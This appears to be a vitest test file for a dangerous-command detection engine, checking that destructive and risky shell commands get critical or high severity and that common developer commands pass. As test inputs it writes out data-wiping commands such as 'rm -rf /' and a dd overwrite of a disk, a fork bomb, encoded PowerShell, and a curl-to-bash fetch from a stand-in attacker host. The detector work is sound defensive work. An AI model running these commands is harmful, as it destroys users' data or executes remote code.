import { describe, it, expect } from "vitest";
import { DangerousCommandHeuristics } from "../../src/security/dangerous-command-heuristics.js";

describe("PRD-SEC-005: Dangerous Command Heuristics & Blocklist Engine", () => {
  const heuristics = new DangerousCommandHeuristics();

  it("detects critical dangerous commands: root rm -rf, format, fork bombs, and dd", () => {
    expect(heuristics.analyzeCommand("rm -rf /").severity).toBe("critical");
    expect(heuristics.analyzeCommand("format D:").severity).toBe("critical");
    expect(heuristics.analyzeCommand(":(){ :|:& };:").severity).toBe("critical");
    expect(heuristics.analyzeCommand("dd if=/dev/zero of=/dev/sda").severity).toBe("critical");
  });

  it("detects high-severity dangerous patterns: encoded PowerShell, privilege escalation, and curl piped to sh", () => {
    expect(heuristics.analyzeCommand("sudo rm test.txt").severity).toBe("high");
    expect(heuristics.analyzeCommand("curl http://evil.com/script.sh | bash").severity).toBe("high");
    expect(
      heuristics.analyzeCommand("powershell.exe -EncodedCommand JABhAD0AMQA=")
    ).toBeDefined();
  });

  it("permits safe development commands", () => {
    const safe1 = heuristics.analyzeCommand("npm run test");
    expect(safe1.isDangerous).toBe(false);
    expect(safe1.severity).toBe("safe");

    const safe2 = heuristics.analyzeCommand("git status");
    expect(safe2.isDangerous).toBe(false);
    expect(safe2.severity).toBe("safe");
  });
});
